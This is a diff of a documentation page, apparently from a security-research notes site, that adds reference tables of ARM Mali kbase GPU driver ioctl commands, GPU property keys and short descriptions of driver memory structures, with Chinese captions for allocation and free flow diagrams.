+<td style="text-align: left;">Sets up a hardware counter reader/dumper. Returns a file descriptor on success.</td>
+<td style="text-align: left;"><code>in</code>: <code>buffer_count</code>, <code>jm_bm</code>, <code>shader_bm</code>, <code>tiler_bm</code>, <code>mmu_l2_bm</code> (all <code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_HWCNT_ENABLE</code></td>
+<td style="text-align: left;">9</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_hwcnt_enable</code></td>
+<td style="text-align: left;">(<strong>Deprecated/Internal?</strong>) Seems related to enabling HW counter collection with specific bitmasks and a dump buffer.</td>
+<td style="text-align: left;"><code>in</code>: <code>dump_buffer</code> (<code>__u64</code>), <code>jm_bm</code>, <code>shader_bm</code>, <code>tiler_bm</code>, <code>mmu_l2_bm</code> (all <code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_HWCNT_DUMP</code></td>
+<td style="text-align: left;">10</td>
+<td style="text-align: left;">None</td>
+<td style="text-align: left;"><em>(None)</em></td>
+<td style="text-align: left;">Triggers a hardware counter dump.</td>
+<td style="text-align: left;">N/A</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_HWCNT_CLEAR</code></td>
+<td style="text-align: left;">11</td>
+<td style="text-align: left;">None</td>
+<td style="text-align: left;"><em>(None)</em></td>
+<td style="text-align: left;">Clears hardware counters.</td>
+<td style="text-align: left;">N/A</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_HWCNT_SET</code></td>
+<td style="text-align: left;">32</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_hwcnt_values</code></td>
+<td style="text-align: left;">Sets dummy hardware counter values (likely for testing/simulation).</td>
+<td style="text-align: left;"><code>in</code>: <code>data</code> (<code>__u64</code>), <code>size</code> (<code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_DISJOINT_QUERY</code></td>
+<td style="text-align: left;">12</td>
+<td style="text-align: left;">R</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_disjoint_query</code></td>
+<td style="text-align: left;">Queries a kernel counter tracking disjoint events (e.g., context switches affecting counters).</td>
+<td style="text-align: left;"><code>out</code>: <code>counter</code> (<code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_GET_DDK_VERSION</code></td>
+<td style="text-align: left;">13</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_get_ddk_version</code></td>
+<td style="text-align: left;">Retrieves the kernel driver version string into a user buffer. Returns bytes written.</td>
+<td style="text-align: left;"><code>in</code>: <code>version_buffer</code> (<code>__u64</code>), <code>size</code> (<code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_JIT_INIT_OLD</code></td>
+<td style="text-align: left;">14</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_mem_jit_init_old</code></td>
+<td style="text-align: left;"><strong>(Old Version)</strong> Initializes the JIT memory allocator zone.</td>
+<td style="text-align: left;"><code>in</code>: <code>va_pages</code> (<code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_JIT_INIT</code></td>
+<td style="text-align: left;">14</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_mem_jit_init</code></td>
+<td style="text-align: left;">Initializes the JIT memory allocator zone with more options (max allocations, trim level).</td>
+<td style="text-align: left;"><code>in</code>: <code>va_pages</code> (<code>__u64</code>), <code>max_allocations</code> (<code>__u8</code>), <code>trim_level</code> (<code>__u8</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_SYNC</code></td>
+<td style="text-align: left;">15</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_mem_sync</code></td>
+<td style="text-align: left;">Performs cache maintenance (clean/invalidate) on a region mapped in both GPU and CPU space.</td>
+<td style="text-align: left;"><code>in</code>: <code>handle</code> (GPU VA), <code>user_addr</code>, <code>size</code> (all <code>__u64</code>), <code>type</code> (<code>__u8</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_FIND_CPU_OFFSET</code></td>
+<td style="text-align: left;">16</td>
+<td style="text-align: left;">R/W</td>
+<td style="text-align: left;"><code>union kbase_ioctl_mem_find_cpu_offset</code></td>
+<td style="text-align: left;">Given a CPU address within a mapped GPU region, finds the offset from the start of the GPU region.</td>
+<td style="text-align: left;"><code>in</code>: <code>gpu_addr</code>, <code>cpu_addr</code>, <code>size</code> (all <code>__u64</code>) <code>&lt;br&gt;</code> <code>out</code>: <code>offset</code> (<code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_GET_CONTEXT_ID</code></td>
+<td style="text-align: left;">17</td>
+<td style="text-align: left;">R</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_get_context_id</code></td>
+<td style="text-align: left;">Retrieves the unique ID of the current kernel context.</td>
+<td style="text-align: left;"><code>out</code>: <code>id</code> (<code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_TLSTREAM_ACQUIRE</code></td>
+<td style="text-align: left;">18</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_tlstream_acquire</code></td>
+<td style="text-align: left;">Acquires a Trace L STREAM (TLStream) file descriptor for tracing.</td>
+<td style="text-align: left;"><code>in</code>: <code>flags</code> (<code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_TLSTREAM_FLUSH</code></td>
+<td style="text-align: left;">19</td>
+<td style="text-align: left;">None</td>
+<td style="text-align: left;"><em>(None)</em></td>
+<td style="text-align: left;">Flushes the TLStream buffer.</td>
+<td style="text-align: left;">N/A</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_COMMIT</code></td>
+<td style="text-align: left;">20</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_mem_commit</code></td>
+<td style="text-align: left;">Changes the amount of physical memory backing a GPU virtual region.</td>
+<td style="text-align: left;"><code>in</code>: <code>gpu_addr</code>, <code>pages</code> (both <code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_ALIAS</code></td>
+<td style="text-align: left;">21</td>
+<td style="text-align: left;">R/W</td>
+<td style="text-align: left;"><code>union kbase_ioctl_mem_alias</code></td>
+<td style="text-align: left;">Creates a new GPU VA mapping that aliases one or more existing memory regions.</td>
+<td style="text-align: left;"><code>in</code>: <code>flags</code>, <code>stride</code>, <code>nents</code>, <code>aliasing_info</code> (ptr) (all <code>__u64</code>) <code>&lt;br&gt;</code> <code>out</code>: <code>flags</code>, <code>gpu_va</code>, <code>va_pages</code> (all <code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_IMPORT</code></td>
+<td style="text-align: left;">22</td>
+<td style="text-align: left;">R/W</td>
+<td style="text-align: left;"><code>union kbase_ioctl_mem_import</code></td>
+<td style="text-align: left;">Imports external memory (e.g., dma-buf) for use by the GPU.</td>
+<td style="text-align: left;"><code>in</code>: <code>flags</code>, <code>phandle</code> (both <code>__u64</code>), <code>type</code> (<code>__u32</code>) <code>&lt;br&gt;</code> <code>out</code>: <code>flags</code>, <code>gpu_va</code>, <code>va_pages</code> (all <code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_FLAGS_CHANGE</code></td>
+<td style="text-align: left;">23</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_mem_flags_change</code></td>
+<td style="text-align: left;">Modifies the flags (e.g., caching, permissions) of an existing GPU memory region.</td>
+<td style="text-align: left;"><code>in</code>: <code>gpu_va</code>, <code>flags</code>, <code>mask</code> (all <code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_STREAM_CREATE</code></td>
+<td style="text-align: left;">24</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_stream_create</code></td>
+<td style="text-align: left;">Creates a synchronization stream (timeline) and returns a file descriptor.</td>
+<td style="text-align: left;"><code>in</code>: <code>name</code> (<code>char[32]</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_FENCE_VALIDATE</code></td>
+<td style="text-align: left;">25</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_fence_validate</code></td>
+<td style="text-align: left;">Validates if a given file descriptor refers to a valid sync fence.</td>
+<td style="text-align: left;"><code>in</code>: <code>fd</code> (<code>int</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_PROFILE_ADD</code></td>
+<td style="text-align: left;">27</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_mem_profile_add</code></td>
+<td style="text-align: left;">Adds memory profiling information (accessible via debugfs).</td>
+<td style="text-align: left;"><code>in</code>: <code>buffer</code> (<code>__u64</code>), <code>len</code> (<code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_STICKY_RESOURCE_MAP</code></td>
+<td style="text-align: left;">29</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_sticky_resource_map</code></td>
+<td style="text-align: left;">Permanently maps external resources (identified by GPU VA) into the context's page tables.</td>
+<td style="text-align: left;"><code>in</code>: <code>count</code>, <code>address</code> (ptr to array) (both <code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_STICKY_RESOURCE_UNMAP</code></td>
+<td style="text-align: left;">30</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_sticky_resource_unmap</code></td>
+<td style="text-align: left;">Unmaps previously permanently mapped sticky resources.</td>
+<td style="text-align: left;"><code>in</code>: <code>count</code>, <code>address</code> (ptr to array) (both <code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET</code></td>
+<td style="text-align: left;">31</td>
+<td style="text-align: left;">R/W</td>
+<td style="text-align: left;"><code>union kbase_ioctl_mem_find_gpu_start_and_offset</code></td>
+<td style="text-align: left;">Given a GPU address within a region, finds the start address of the region and the offset of the given address within it.</td>
+<td style="text-align: left;"><code>in</code>: <code>gpu_addr</code>, <code>size</code> (both <code>__u64</code>) <code>&lt;br&gt;</code> <code>out</code>: <code>start</code>, <code>offset</code> (both <code>__u64</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_CINSTR_GWT_START</code></td>
+<td style="text-align: left;">33</td>
+<td style="text-align: left;">None</td>
+<td style="text-align: left;"><em>(None)</em></td>
+<td style="text-align: left;">Starts GPU Write Tracking (GWT) for Command Instrumention (CINSTR).</td>
+<td style="text-align: left;">N/A</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_CINSTR_GWT_STOP</code></td>
+<td style="text-align: left;">34</td>
+<td style="text-align: left;">None</td>
+<td style="text-align: left;"><em>(None)</em></td>
+<td style="text-align: left;">Stops GPU Write Tracking (GWT).</td>
+<td style="text-align: left;">N/A</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_CINSTR_GWT_DUMP</code></td>
+<td style="text-align: left;">35</td>
+<td style="text-align: left;">R/W</td>
+<td style="text-align: left;"><code>union kbase_ioctl_cinstr_gwt_dump</code></td>
+<td style="text-align: left;">Dumps the addresses and sizes (in pages) of memory areas modified by the GPU since GWT started.</td>
+<td style="text-align: left;"><code>in</code>: <code>addr_buffer</code>, <code>size_buffer</code> (both <code>__u64</code>), <code>len</code> (<code>__u32</code>) <code>&lt;br&gt;</code> <code>out</code>: <code>no_of_addr_collected</code> (<code>__u32</code>), <code>more_data_available</code> (<code>__u8</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_MEM_EXEC_INIT</code></td>
+<td style="text-align: left;">38</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_mem_exec_init</code></td>
+<td style="text-align: left;">Initializes the EXEC_VA memory zone (likely for executable shader code).</td>
+<td style="text-align: left;"><code>in</code>: <code>va_pages</code> (<code>__u64</code>)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="test-ioctls-kbase_ioctl_test_type-0x81">Test IOCTLs (<code>KBASE_IOCTL_TEST_TYPE 0x81</code>)<a class="headerlink" href="#test-ioctls-kbase_ioctl_test_type-0x81" title="Permanent link">¶</a></h3>
+<p>These are only available if <code>MALI_UNIT_TEST</code> is defined during kernel build.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Macro Name</th>
+<th style="text-align: left;">Cmd Nr</th>
+<th style="text-align: left;">Direction</th>
+<th style="text-align: left;">Data Structure</th>
+<th style="text-align: left;">Description</th>
+<th style="text-align: left;">Key Members (Input <code>in</code>/Output <code>out</code>)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_TLSTREAM_TEST</code></td>
+<td style="text-align: left;">1</td>
+<td style="text-align: left;">W</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_tlstream_test</code></td>
+<td style="text-align: left;">Starts a TLStream test with configurable parameters.</td>
+<td style="text-align: left;"><code>in</code>: <code>tpw_count</code>, <code>msg_delay</code>, <code>msg_count</code>, <code>aux_msg</code> (all <code>__u32</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_IOCTL_TLSTREAM_STATS</code></td>
+<td style="text-align: left;">2</td>
+<td style="text-align: left;">R</td>
+<td style="text-align: left;"><code>struct kbase_ioctl_tlstream_stats</code></td>
+<td style="text-align: left;">Reads TLStream statistics generated during a test run.</td>
+<td style="text-align: left;"><code>out</code>: <code>bytes_collected</code>, <code>bytes_generated</code> (both <code>__u32</code>)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="customer-extension-ioctls-kbase_ioctl_extra_type-0x82">Customer Extension IOCTLs (<code>KBASE_IOCTL_EXTRA_TYPE 0x82</code>)<a class="headerlink" href="#customer-extension-ioctls-kbase_ioctl_extra_type-0x82" title="Permanent link">¶</a></h3>
+<p>This type is reserved for custom additions by integrators. No specific IOCTLs are defined in this base header file under this type.</p>
+<hr>
+<h3 id="gpu-property-keys-used-with-kbase_ioctl_get_gpuprops">GPU Property Keys (Used with <code>KBASE_IOCTL_GET_GPUPROPS</code>)<a class="headerlink" href="#gpu-property-keys-used-with-kbase_ioctl_get_gpuprops" title="Permanent link">¶</a></h3>
+<p>These are <em>keys</em> used within the buffer passed to <code>KBASE_IOCTL_GET_GPUPROPS</code>. The lower 2 bits of the key indicate the size of the following value (00=u8, 01=u16, 10=u32, 11=u64).</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Property Name</th>
+<th style="text-align: left;">Key Value</th>
+<th style="text-align: left;">Description</th>
+<th style="text-align: left;">Value Size Type (Implied)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_PRODUCT_ID</code></td>
+<td style="text-align: left;">1</td>
+<td style="text-align: left;">GPU Product ID</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_VERSION_STATUS</code></td>
+<td style="text-align: left;">2</td>
+<td style="text-align: left;">Version status (e.g., alpha, beta, production)</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_MINOR_REVISION</code></td>
+<td style="text-align: left;">3</td>
+<td style="text-align: left;">Minor revision number</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_MAJOR_REVISION</code></td>
+<td style="text-align: left;">4</td>
+<td style="text-align: left;">Major revision number</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_GPU_FREQ_KHZ_MAX</code></td>
+<td style="text-align: left;">6</td>
+<td style="text-align: left;">Maximum GPU frequency in kHz</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_LOG2_PROGRAM_COUNTER_SIZE</code></td>
+<td style="text-align: left;">8</td>
+<td style="text-align: left;">Log2 of the program counter size in bits</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_TEXTURE_FEATURES_0</code>..<code>_3</code></td>
+<td style="text-align: left;">9-11, 80</td>
+<td style="text-align: left;">Texture feature registers (bitfields)</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_GPU_AVAILABLE_MEMORY_SIZE</code></td>
+<td style="text-align: left;">12</td>
+<td style="text-align: left;">Total GPU-accessible memory size (bytes)</td>
+<td style="text-align: left;">u64</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_L2_LOG2_LINE_SIZE</code></td>
+<td style="text-align: left;">13</td>
+<td style="text-align: left;">Log2 of L2 cache line size in bytes</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_L2_LOG2_CACHE_SIZE</code></td>
+<td style="text-align: left;">14</td>
+<td style="text-align: left;">Log2 of total L2 cache size in bytes</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_L2_NUM_L2_SLICES</code></td>
+<td style="text-align: left;">15</td>
+<td style="text-align: left;">Number of L2 cache slices</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_TILER_BIN_SIZE_BYTES</code></td>
+<td style="text-align: left;">16</td>
+<td style="text-align: left;">Tiler bin size in bytes</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_TILER_MAX_ACTIVE_LEVELS</code></td>
+<td style="text-align: left;">17</td>
+<td style="text-align: left;">Maximum active hierarchical tiling levels</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_MAX_THREADS</code></td>
+<td style="text-align: left;">18</td>
+<td style="text-align: left;">Maximum threads per core</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_MAX_WORKGROUP_SIZE</code></td>
+<td style="text-align: left;">19</td>
+<td style="text-align: left;">Maximum workgroup size (threads)</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_MAX_BARRIER_SIZE</code></td>
+<td style="text-align: left;">20</td>
+<td style="text-align: left;">Maximum barrier size (threads)</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_MAX_REGISTERS</code></td>
+<td style="text-align: left;">21</td>
+<td style="text-align: left;">Maximum registers per thread</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_MAX_TASK_QUEUE</code></td>
+<td style="text-align: left;">22</td>
+<td style="text-align: left;">Maximum tasks in queue (?)</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_MAX_THREAD_GROUP_SPLIT</code></td>
+<td style="text-align: left;">23</td>
+<td style="text-align: left;">Maximum thread group split factor</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_IMPL_TECH</code></td>
+<td style="text-align: left;">24</td>
+<td style="text-align: left;">Implementation technology (?)</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_RAW_*</code></td>
+<td style="text-align: left;">25-60, 81</td>
+<td style="text-align: left;">Raw hardware configuration/feature registers</td>
+<td style="text-align: left;">Varies (u8, u16, u32, u64)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_COHERENCY_*</code></td>
+<td style="text-align: left;">61-79</td>
+<td style="text-align: left;">Coherency configuration details</td>
+<td style="text-align: left;">Varies (u8, u16, u32)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_NUM_EXEC_ENGINES</code></td>
+<td style="text-align: left;">82</td>
+<td style="text-align: left;">Number of execution engines (cores)</td>
+<td style="text-align: left;">u32</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_RAW_THREAD_TLS_ALLOC</code></td>
+<td style="text-align: left;">83</td>
+<td style="text-align: left;">Raw TLS allocation per thread</td>
+<td style="text-align: left;">u16</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>KBASE_GPUPROP_TLS_ALLOC</code></td>
+<td style="text-align: left;">84</td>
+<td style="text-align: left;">TLS allocation per thread (bytes)</td>
+<td style="text-align: left;">u32</td>
+</tr>
+</tbody>
+</table>
+<h3 id="kbase_context">kbase_context<a class="headerlink" href="#kbase_context" title="Permanent link">¶</a></h3>
+<p><strong><code>struct kbase_context</code></strong></p>
+<p>This structure represents the context for managing GPU resources, including memory allocation and scheduling.</p>
+<h3 id="kbase_va_region">kbase_va_region<a class="headerlink" href="#kbase_va_region" title="Permanent link">¶</a></h3>
+<p><strong><code>struct kbase_va_region</code></strong></p>
+<p>This structure represents a contiguous region within the GPU's virtual address space allocated for a specific context (<code>kbase_context</code>). It tracks the region's properties, size, location, backing physical memory, and status.</p>
+<h3 id="kbase_mem_phy_alloc">kbase_mem_phy_alloc<a class="headerlink" href="#kbase_mem_phy_alloc" title="Permanent link">¶</a></h3>
+<p><strong><code>struct kbase_mem_phy_alloc</code></strong></p>
+<p>This structure represents a collection of physical memory pages used to back GPU virtual memory regions or other memory constructs (like imported buffers). It tracks the lifecycle, mappings, and properties of these physical pages. The total number of pages allocated (<code>N</code>) is managed by the creator, while this struct tracks the number currently valid/present (<code>nents</code>).</p>
+<p>空间申请流程：</p>
+<p><img alt="1745323343842" src="../image/mali/1745323343842.png"></p>
+<p>图片来源：<a href="https://7r1pl3j.github.io/2022/11/20/gpu/">gpu | Hexo</a></p>
+<p>空间释放流程：</p>
+<p><img alt="free" src="../image/mali/free.svg"></p>
+<p>简化版：</p>
+<p><img alt="free_sim" src="../image/mali/free_sim.svg"></p>
+<p>三个关键的对象之间的联系：</p>
+<p><img alt="object" src="../image/mali/object.svg"></p></div>
 
 
 
@@ -2412,7 +2806,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">October 28, 2024</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">April 22, 2025</span>
   </span>
 
     
@@ -2445,6 +2839,44 @@
       
         <footer class="md-footer">
   
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../../CTF/CVE/CVE-2022-36449/" class="md-footer__link md-footer__link--prev" aria-label="Previous: CVE-2022-36449">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                CVE-2022-36449
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../UE/" class="md-footer__link md-footer__link--next" aria-label="Next: 介绍">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                介绍
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
     
   
   <div class="md-footer-meta md-typeset">
@@ -2480,14 +2912,14 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "search.suggest", "search.highlight", "navigation.expand", "navigation.indexes", "navigation.path", "search.share", "toc.follow", "toc.integrate", "header.autohide", "navigation.footer", "content.code.annotate", "content.code.copy", "content.action.edit", "content.action.view"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "search.suggest", "search.highlight", "navigation.expand", "navigation.indexes", "navigation.path", "search.share", "toc.follow", "toc.integrate", "header.autohide", "navigation.footer", "content.code.annotate", "content.code.copy", "content.action.edit", "content.action.view"], "search": "../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
-      <script src="../../../../assets/javascripts/bundle.ad660dcc.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.ad660dcc.min.js"></script>
       
-        <script src="../../../../javascripts/MathJax-4.0.0-beta.7/tex-mml-chtml.js"></script>
+        <script src="../../../javascripts/MathJax-4.0.0-beta.7/tex-mml-chtml.js"></script>
       
-        <script src="../../../../javascripts/canvas-nest.js"></script>
+        <script src="../../../javascripts/canvas-nest.js"></script>
       
     
   </body>
